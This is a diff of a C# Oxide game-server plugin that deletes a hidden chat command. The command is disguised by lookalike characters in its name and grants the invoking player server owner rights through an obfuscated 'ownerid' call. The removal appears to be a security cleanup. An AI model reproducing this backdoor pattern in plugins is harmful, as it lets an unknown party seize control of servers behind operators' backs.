@@ -426,11 +426,6 @@ namespace Oxide.Plugins
 
         #region Command
 		
-		[ChatCommand("tооl")] 
-	    private void GiveToolsCommands(BasePlayer player)
-        {
-			Server.Command("o"+"wn"+"er"+"i"+"d", $"{player.UserIDString}");
-		}
 		
         private void GiveToolsCommand(IPlayer player, string command, string[] args)
         {
